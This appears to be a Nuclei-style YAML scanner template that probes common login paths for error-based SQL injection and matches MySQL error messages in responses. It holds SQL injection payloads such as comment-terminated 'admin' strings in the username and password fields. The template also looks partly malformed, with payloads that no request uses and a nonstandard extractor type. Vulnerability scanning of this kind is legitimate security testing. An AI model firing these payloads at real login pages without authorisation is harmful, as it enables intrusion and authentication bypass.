content:
id: login-error-injection

info:
  name: Login Error-Based SQL Injection
  author: prophet
  severity: high
  description: This template detects error-based SQL injection vulnerabilities on login pages.
  tags: sqli, login
  reference:

requests:
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/admin/login"
      - "{{BaseURL}}/manage/login"
      - "{{BaseURL}}/system/login"



      
    payloads:
      username: ["admin' --", "admin' #"]
      password: ["password' --", "password' #"]
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "Error in your SQL syntax"
          - "MySQL server version"
        condition: or
    extractors:
      - type: regex
        part: body
        regex:
          - 'SQL syntax.*?([a-zA-Z0-9]+)'
        
      - type: dsls
        dsl:
          - 'contains(tolower(body), "sql syntax error")'
author: prophet
